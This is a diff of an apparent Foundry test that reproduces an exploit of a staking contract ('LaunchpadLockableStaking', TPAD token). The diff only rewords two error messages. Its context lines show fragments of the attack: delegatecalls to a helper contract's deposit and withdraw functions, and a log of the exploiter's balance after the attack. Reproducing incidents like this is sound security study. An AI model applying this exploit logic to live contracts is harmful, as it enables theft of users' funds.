@@ -80,7 +80,7 @@ contract ContractTest is Test {
         (bool success,) = address(helperContract).delegatecall(
             abi.encodeWithSignature("deposit(address,uint256,uint256)", address(LaunchpadLockableStaking), 30, 1)
         );
-        require(success, "Delegatecall to deposit not successfull");
+        require(success, "Delegatecall to deposit not successfully");
 
         assertEq(TPAD.balanceOf(address(this)), startBalanceTPAD - 1);
 
@@ -91,7 +91,7 @@ contract ContractTest is Test {
         (success,) = address(helperContract).delegatecall(
             abi.encodeWithSignature("withdraw(address,uint256)", address(LaunchpadLockableStaking), 0)
         );
-        require(success, "Delegatecall to withdraw not successfull");
+        require(success, "Delegatecall to withdraw not successfully");
 
         emit log_named_decimal_uint(
             "Exploiter's helper contract TPAD balance after attack",
